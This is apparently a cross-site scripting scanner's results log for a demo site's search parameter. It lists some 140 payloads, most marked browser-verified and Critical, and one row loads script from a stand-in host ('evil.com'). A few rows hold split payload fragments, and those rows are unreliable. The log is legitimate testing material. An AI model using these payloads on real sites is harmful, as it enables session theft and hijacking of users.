Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 17:58:56.465,2026-01-10 17:58:57.227,0.762,https://demo-knsl.onrender.com/search,GET,q,<div id=x tabindex=1 onactivate=alert(1)></div>,RAW_REFLECTION,No,,High
2026-01-10 17:58:57.156,2026-01-10 17:58:57.256,0.100,https://demo-knsl.onrender.com/search,GET,q,<use href=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.163,2026-01-10 17:58:57.292,0.130,https://demo-knsl.onrender.com/search,GET,q,<textarea autofocus onfocus=alert(1)></textarea>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.068,2026-01-10 17:58:57.294,0.225,https://demo-knsl.onrender.com/search,GET,q,<source src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.183,2026-01-10 17:58:57.298,0.116,https://demo-knsl.onrender.com/search,GET,q,<div onpointerdown=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.189,2026-01-10 17:58:57.299,0.111,https://demo-knsl.onrender.com/search,GET,q,<div onpointerup=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.225,2026-01-10 17:58:57.325,0.101,https://demo-knsl.onrender.com/search,GET,q,<div onpointerover=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.227,2026-01-10 17:58:57.328,0.101,https://demo-knsl.onrender.com/search,GET,q,<div onpointerenter=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.328,2026-01-10 17:58:57.399,0.071,https://demo-knsl.onrender.com/search,GET,q,"<div style=""animation:spin 1s"" onanimationend=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-10 17:58:57.326,2026-01-10 17:58:57.399,0.074,https://demo-knsl.onrender.com/search,GET,q,"<div style=""animation:spin 1s"" onanimationstart=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-10 17:58:57.292,2026-01-10 17:58:57.429,0.137,https://demo-knsl.onrender.com/search,GET,q,<div onpointermove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.256,2026-01-10 17:58:57.433,0.176,https://demo-knsl.onrender.com/search,GET,q,<div onpointerleave=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.294,2026-01-10 17:58:57.434,0.140,https://demo-knsl.onrender.com/search,GET,q,<div ontouchstart=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.299,2026-01-10 17:58:57.438,0.139,https://demo-knsl.onrender.com/search,GET,q,<div ontouchmove=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.298,2026-01-10 17:58:57.446,0.148,https://demo-knsl.onrender.com/search,GET,q,<div ontouchend=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.160,2026-01-10 17:58:57.453,0.293,https://demo-knsl.onrender.com/search,GET,q,<input autofocus onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.169,2026-01-10 17:58:57.460,0.291,https://demo-knsl.onrender.com/search,GET,q,<select autofocus onfocus=alert(1)></select>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.399,2026-01-10 17:58:57.479,0.080,https://demo-knsl.onrender.com/search,GET,q,"<div style=""animation:spin 1s"" onanimationiteration=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-10 17:58:57.399,2026-01-10 17:58:57.483,0.083,https://demo-knsl.onrender.com/search,GET,q,"<div style=""transition:all 1s"" ontransitionend=alert(1)>X</div>",NO_REFLECTION,No,,Info
2026-01-10 17:58:57.434,2026-01-10 17:58:57.495,0.062,https://demo-knsl.onrender.com/search,GET,q,<div contenteditable oninput=alert(1)>X</div>,NO_REFLECTION,No,,Info
2026-01-10 17:58:57.446,2026-01-10 17:58:57.505,0.059,https://demo-knsl.onrender.com/search,GET,q,<select><option oninput=alert(1)>X</option></select>,NO_REFLECTION,No,,Info
2026-01-10 17:58:57.433,2026-01-10 17:58:57.539,0.106,https://demo-knsl.onrender.com/search,GET,q,<input accesskey=x onclick=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.429,2026-01-10 17:58:57.540,0.110,https://demo-knsl.onrender.com/search,GET,q,<div data-x=x onclick=alert(1)>X</div>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.438,2026-01-10 17:58:57.542,0.105,https://demo-knsl.onrender.com/search,GET,q,<input type=hidden onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.153,2026-01-10 17:58:57.544,0.391,https://demo-knsl.onrender.com/search,GET,q,<image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.453,2026-01-10 17:58:57.557,0.104,https://demo-knsl.onrender.com/search,GET,q,"<img/src=""x""/onerror=alert(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.460,2026-01-10 17:58:57.561,0.102,https://demo-knsl.onrender.com/search,GET,q,<img%20src=x%20onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.479,2026-01-10 17:58:57.607,0.128,https://demo-knsl.onrender.com/search,GET,q,<img	src=x	onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.495,2026-01-10 17:58:57.607,0.112,https://demo-knsl.onrender.com/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.505,2026-01-10 17:58:57.607,0.103,https://demo-knsl.onrender.com/search,GET,q,>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.483,2026-01-10 17:58:57.607,0.125,https://demo-knsl.onrender.com/search,GET,q,<script	>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.539,2026-01-10 17:58:57.642,0.103,https://demo-knsl.onrender.com/search,GET,q,<script,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.540,2026-01-10 17:58:57.642,0.102,https://demo-knsl.onrender.com/search,GET,q,src=//evil.com></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.542,2026-01-10 17:58:57.645,0.103,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.544,2026-01-10 17:58:57.652,0.108,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.562,2026-01-10 17:58:57.668,0.107,https://demo-knsl.onrender.com/search,GET,q,<marquee onstart=prompt(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.607,2026-01-10 17:58:57.708,0.101,https://demo-knsl.onrender.com/search,GET,q,<iframe/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.607,2026-01-10 17:58:57.708,0.101,https://demo-knsl.onrender.com/search,GET,q,<marquee onstart=confirm(1)>X</marquee>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.607,2026-01-10 17:58:57.710,0.102,https://demo-knsl.onrender.com/search,GET,q,<iframe%20src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.607,2026-01-10 17:58:57.710,0.102,https://demo-knsl.onrender.com/search,GET,q,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.642,2026-01-10 17:58:57.740,0.098,https://demo-knsl.onrender.com/search,GET,q,<object/data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.642,2026-01-10 17:58:57.748,0.106,https://demo-knsl.onrender.com/search,GET,q,"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.645,2026-01-10 17:58:57.758,0.113,https://demo-knsl.onrender.com/search,GET,q,<embed/src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.652,2026-01-10 17:58:57.762,0.110,https://demo-knsl.onrender.com/search,GET,q,"<embed src=data:text/html,<script>alert(1)</script>>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.668,2026-01-10 17:58:57.779,0.111,https://demo-knsl.onrender.com/search,GET,q,<var onmouseover=alert(1)>X</var>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.708,2026-01-10 17:58:57.813,0.105,https://demo-knsl.onrender.com/search,GET,q,<code onmouseover=alert(1)>X</code>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.708,2026-01-10 17:58:57.813,0.105,https://demo-knsl.onrender.com/search,GET,q,<span onmouseover=alert(1)>X</span>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.710,2026-01-10 17:58:57.815,0.106,https://demo-knsl.onrender.com/search,GET,q,<p onmouseover=alert(1)>X</p>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.710,2026-01-10 17:58:57.816,0.106,https://demo-knsl.onrender.com/search,GET,q,<h1 onmouseover=alert(1)>X</h1>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.748,2026-01-10 17:58:57.857,0.109,https://demo-knsl.onrender.com/search,GET,q,<pre onmouseover=alert(1)>X</pre>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.740,2026-01-10 17:58:57.857,0.117,https://demo-knsl.onrender.com/search,GET,q,<h2 onmouseover=alert(1)>X</h2>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.758,2026-01-10 17:58:57.863,0.105,https://demo-knsl.onrender.com/search,GET,q,<blockquote onmouseover=alert(1)>X</blockquote>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.762,2026-01-10 17:58:57.869,0.107,https://demo-knsl.onrender.com/search,GET,q,<ol onmouseover=alert(1)><li>X</li></ol>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.779,2026-01-10 17:58:57.915,0.137,https://demo-knsl.onrender.com/search,GET,q,<ul onmouseover=alert(1)><li>X</li></ul>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.869,2026-01-10 17:58:57.943,0.074,https://demo-knsl.onrender.com/search,GET,q,<table><caption onmouseover=alert(1)>X</caption></table>,NO_REFLECTION,No,,Info
2026-01-10 17:58:57.813,2026-01-10 17:58:57.945,0.132,https://demo-knsl.onrender.com/search,GET,q,<dl onmouseover=alert(1)><dt>X</dt></dl>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.816,2026-01-10 17:58:57.946,0.130,https://demo-knsl.onrender.com/search,GET,q,<dd onmouseover=alert(1)>X</dd>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.815,2026-01-10 17:58:57.946,0.131,https://demo-knsl.onrender.com/search,GET,q,<dt onmouseover=alert(1)>X</dt>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.813,2026-01-10 17:58:57.946,0.133,https://demo-knsl.onrender.com/search,GET,q,<li onmouseover=alert(1)>X</li>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.857,2026-01-10 17:58:57.966,0.109,https://demo-knsl.onrender.com/search,GET,q,<fieldset onmouseover=alert(1)>X</fieldset>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.857,2026-01-10 17:58:57.967,0.110,https://demo-knsl.onrender.com/search,GET,q,<legend onmouseover=alert(1)>X</legend>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.863,2026-01-10 17:58:57.986,0.123,https://demo-knsl.onrender.com/search,GET,q,<label onmouseover=alert(1)>X</label>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.915,2026-01-10 17:58:58.017,0.102,https://demo-knsl.onrender.com/search,GET,q,<table><colgroup onmouseover=alert(1)></colgroup></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.946,2026-01-10 17:58:58.068,0.122,https://demo-knsl.onrender.com/search,GET,q,<table><tr onmouseover=alert(1)></tr></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.946,2026-01-10 17:58:58.070,0.124,https://demo-knsl.onrender.com/search,GET,q,<table><tfoot onmouseover=alert(1)></tfoot></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.943,2026-01-10 17:58:58.076,0.133,https://demo-knsl.onrender.com/search,GET,q,<table><col onmouseover=alert(1)></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.946,2026-01-10 17:58:58.076,0.130,https://demo-knsl.onrender.com/search,GET,q,<table><tbody onmouseover=alert(1)></tbody></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.966,2026-01-10 17:58:58.083,0.117,https://demo-knsl.onrender.com/search,GET,q,<table><th onmouseover=alert(1)>X</th></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.945,2026-01-10 17:58:58.086,0.141,https://demo-knsl.onrender.com/search,GET,q,<table><thead onmouseover=alert(1)></thead></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.967,2026-01-10 17:58:58.098,0.131,https://demo-knsl.onrender.com/search,GET,q,<table><td onmouseover=alert(1)>X</td></table>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.986,2026-01-10 17:58:58.099,0.113,https://demo-knsl.onrender.com/search,GET,q,<meter onmouseover=alert(1)>X</meter>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.017,2026-01-10 17:58:58.131,0.114,https://demo-knsl.onrender.com/search,GET,q,<progress onmouseover=alert(1)>X</progress>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.068,2026-01-10 17:58:58.174,0.105,https://demo-knsl.onrender.com/search,GET,q,<output onmouseover=alert(1)>X</output>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.070,2026-01-10 17:58:58.174,0.104,https://demo-knsl.onrender.com/search,GET,q,<time onmouseover=alert(1)>X</time>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.076,2026-01-10 17:58:58.184,0.108,https://demo-knsl.onrender.com/search,GET,q,<ruby onmouseover=alert(1)>X</ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.076,2026-01-10 17:58:58.186,0.109,https://demo-knsl.onrender.com/search,GET,q,<mark onmouseover=alert(1)>X</mark>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.083,2026-01-10 17:58:58.196,0.112,https://demo-knsl.onrender.com/search,GET,q,<ruby><rt onmouseover=alert(1)>X</rt></ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.098,2026-01-10 17:58:58.203,0.105,https://demo-knsl.onrender.com/search,GET,q,<bdi onmouseover=alert(1)>X</bdi>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.086,2026-01-10 17:58:58.203,0.117,https://demo-knsl.onrender.com/search,GET,q,<ruby><rp onmouseover=alert(1)>X</rp></ruby>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.099,2026-01-10 17:58:58.206,0.106,https://demo-knsl.onrender.com/search,GET,q,<bdo onmouseover=alert(1)>X</bdo>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.131,2026-01-10 17:58:58.232,0.100,https://demo-knsl.onrender.com/search,GET,q,<wbr onmouseover=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.186,2026-01-10 17:58:58.243,0.058,https://demo-knsl.onrender.com/search,GET,q,<strong onmouseover=alert(1)>X</strong>,NO_REFLECTION,No,,Info
2026-01-10 17:58:58.184,2026-01-10 17:58:58.285,0.101,https://demo-knsl.onrender.com/search,GET,q,<small onmouseover=alert(1)>X</small>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.174,2026-01-10 17:58:58.285,0.112,https://demo-knsl.onrender.com/search,GET,q,<del onmouseover=alert(1)>X</del>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:57.557,2026-01-10 17:58:58.286,0.729,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=print()>,RAW_REFLECTION,No,,High
2026-01-10 17:58:58.196,2026-01-10 17:58:58.295,0.100,https://demo-knsl.onrender.com/search,GET,q,<em onmouseover=alert(1)>X</em>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.174,2026-01-10 17:58:58.295,0.122,https://demo-knsl.onrender.com/search,GET,q,<ins onmouseover=alert(1)>X</ins>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.203,2026-01-10 17:58:58.303,0.100,https://demo-knsl.onrender.com/search,GET,q,<i onmouseover=alert(1)>X</i>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.203,2026-01-10 17:58:58.308,0.105,https://demo-knsl.onrender.com/search,GET,q,<b onmouseover=alert(1)>X</b>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.232,2026-01-10 17:58:58.337,0.105,https://demo-knsl.onrender.com/search,GET,q,<s onmouseover=alert(1)>X</s>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.243,2026-01-10 17:58:58.353,0.110,https://demo-knsl.onrender.com/search,GET,q,<sub onmouseover=alert(1)>X</sub>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.285,2026-01-10 17:58:58.399,0.113,https://demo-knsl.onrender.com/search,GET,q,<abbr onmouseover=alert(1)>X</abbr>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.285,2026-01-10 17:58:58.399,0.114,https://demo-knsl.onrender.com/search,GET,q,<sup onmouseover=alert(1)>X</sup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.286,2026-01-10 17:58:58.399,0.113,https://demo-knsl.onrender.com/search,GET,q,<address onmouseover=alert(1)>X</address>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.295,2026-01-10 17:58:58.403,0.108,https://demo-knsl.onrender.com/search,GET,q,<article onmouseover=alert(1)>X</article>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.295,2026-01-10 17:58:58.403,0.108,https://demo-knsl.onrender.com/search,GET,q,<aside onmouseover=alert(1)>X</aside>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.303,2026-01-10 17:58:58.415,0.112,https://demo-knsl.onrender.com/search,GET,q,<footer onmouseover=alert(1)>X</footer>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.308,2026-01-10 17:58:58.416,0.107,https://demo-knsl.onrender.com/search,GET,q,<header onmouseover=alert(1)>X</header>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.337,2026-01-10 17:58:58.446,0.109,https://demo-knsl.onrender.com/search,GET,q,<hgroup onmouseover=alert(1)>X</hgroup>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.399,2026-01-10 17:58:58.476,0.078,https://demo-knsl.onrender.com/search,GET,q,<section onmouseover=alert(1)>X</section>,NO_REFLECTION,No,,Info
2026-01-10 17:58:58.403,2026-01-10 17:58:58.477,0.074,https://demo-knsl.onrender.com/search,GET,q,<figcaption onmouseover=alert(1)>X</figcaption>,NO_REFLECTION,No,,Info
2026-01-10 17:58:58.353,2026-01-10 17:58:58.480,0.127,https://demo-knsl.onrender.com/search,GET,q,<nav onmouseover=alert(1)>X</nav>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.399,2026-01-10 17:58:58.506,0.108,https://demo-knsl.onrender.com/search,GET,q,<main onmouseover=alert(1)>X</main>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.399,2026-01-10 17:58:58.506,0.107,https://demo-knsl.onrender.com/search,GET,q,<figure onmouseover=alert(1)>X</figure>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.403,2026-01-10 17:58:58.532,0.129,https://demo-knsl.onrender.com/search,GET,q,<dialog onmouseover=alert(1)>X</dialog>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.415,2026-01-10 17:58:58.532,0.117,https://demo-knsl.onrender.com/search,GET,q,<menu onmouseover=alert(1)>X</menu>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.477,2026-01-10 17:58:58.587,0.110,https://demo-knsl.onrender.com/search,GET,q,<button onclick=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:58:58.416,2026-01-10 17:58:58.589,0.173,https://demo-knsl.onrender.com/search,GET,q,<menuitem onmouseover=alert(1)>X</menuitem>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.446,2026-01-10 17:58:58.589,0.143,https://demo-knsl.onrender.com/search,GET,q,<details><summary onmouseover=alert(1)>X</summary></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.480,2026-01-10 17:58:58.614,0.134,https://demo-knsl.onrender.com/search,GET,q,<button ondblclick=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:58:58.506,2026-01-10 17:58:58.614,0.108,https://demo-knsl.onrender.com/search,GET,q,<button onmousedown=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:58:58.506,2026-01-10 17:58:58.620,0.113,https://demo-knsl.onrender.com/search,GET,q,<button onmouseup=alert(1)>X</button>,NO_REFLECTION,No,,Info
2026-01-10 17:58:58.476,2026-01-10 17:58:58.634,0.158,https://demo-knsl.onrender.com/search,GET,q,<canvas onmouseover=alert(1)>X</canvas>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.532,2026-01-10 17:58:58.668,0.136,https://demo-knsl.onrender.com/search,GET,q,'><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.532,2026-01-10 17:58:58.674,0.142,https://demo-knsl.onrender.com/search,GET,q,"""><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.587,2026-01-10 17:58:58.700,0.113,https://demo-knsl.onrender.com/search,GET,q,"""></script><script>alert(1)</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.589,2026-01-10 17:58:58.700,0.111,https://demo-knsl.onrender.com/search,GET,q,""";alert(1);//",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.589,2026-01-10 17:58:58.705,0.116,https://demo-knsl.onrender.com/search,GET,q,';alert(1);//,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.614,2026-01-10 17:58:58.717,0.103,https://demo-knsl.onrender.com/search,GET,q,""" onmouseover=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.614,2026-01-10 17:58:58.721,0.106,https://demo-knsl.onrender.com/search,GET,q,"""onmouseover=""alert(1)",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.620,2026-01-10 17:58:58.725,0.106,https://demo-knsl.onrender.com/search,GET,q,' onmouseover=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.634,2026-01-10 17:58:58.739,0.104,https://demo-knsl.onrender.com/search,GET,q,""" autofocus onfocus=alert(1) x=""",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.668,2026-01-10 17:58:58.779,0.111,https://demo-knsl.onrender.com/search,GET,q,' autofocus onfocus=alert(1) x=',RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.674,2026-01-10 17:58:58.798,0.124,https://demo-knsl.onrender.com/search,GET,q,</script><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.700,2026-01-10 17:58:58.814,0.113,https://demo-knsl.onrender.com/search,GET,q,</script><svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.705,2026-01-10 17:58:58.815,0.110,https://demo-knsl.onrender.com/search,GET,q,--><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.717,2026-01-10 17:58:58.815,0.098,https://demo-knsl.onrender.com/search,GET,q,--!><script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.700,2026-01-10 17:58:58.815,0.115,https://demo-knsl.onrender.com/search,GET,q,</script><img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.725,2026-01-10 17:58:58.825,0.100,https://demo-knsl.onrender.com/search,GET,q,<q/onclick=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.721,2026-01-10 17:58:58.836,0.115,https://demo-knsl.onrender.com/search,GET,q,<q/oncut=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.739,2026-01-10 17:58:58.846,0.108,https://demo-knsl.onrender.com/search,GET,q,<q/ondrag=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.846,2026-01-10 17:58:58.910,0.064,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1) onerror=alert(1)>,NO_REFLECTION,No,,Info
2026-01-10 17:58:58.779,2026-01-10 17:58:58.939,0.159,https://demo-knsl.onrender.com/search,GET,q,<q/onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.798,2026-01-10 17:58:58.939,0.140,https://demo-knsl.onrender.com/search,GET,q,<a href=#x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.814,2026-01-10 17:58:58.949,0.135,https://demo-knsl.onrender.com/search,GET,q,<a name=x onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.815,2026-01-10 17:58:58.949,0.134,https://demo-knsl.onrender.com/search,GET,q,"'"">><marquee onstart=prompt(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.815,2026-01-10 17:58:58.950,0.134,https://demo-knsl.onrender.com/search,GET,q,"'"">><marquee onstart=confirm(1)>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.836,2026-01-10 17:58:58.952,0.116,https://demo-knsl.onrender.com/search,GET,q,<img src=x oneonerrorrror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.815,2026-01-10 17:58:58.953,0.138,https://demo-knsl.onrender.com/search,GET,q,<a href=x target=_blank onclick=alert(1)>X</a>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.825,2026-01-10 17:58:58.955,0.129,https://demo-knsl.onrender.com/search,GET,q,"'"">><div onmouseover=alert(1)>X</div>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 17:58:58.206,2026-01-10 17:58:58.966,0.760,https://demo-knsl.onrender.com/search,GET,q,<u onmouseover=alert(1)>X</u>,RAW_REFLECTION,No,,High
2026-01-10 17:58:58.939,2026-01-10 17:58:59.042,0.104,https://demo-knsl.onrender.com/search,GET,q,<input type=submit formaction=javascript:alert(1) value=X>,RAW_REFLECTION,Yes,alert,Critical
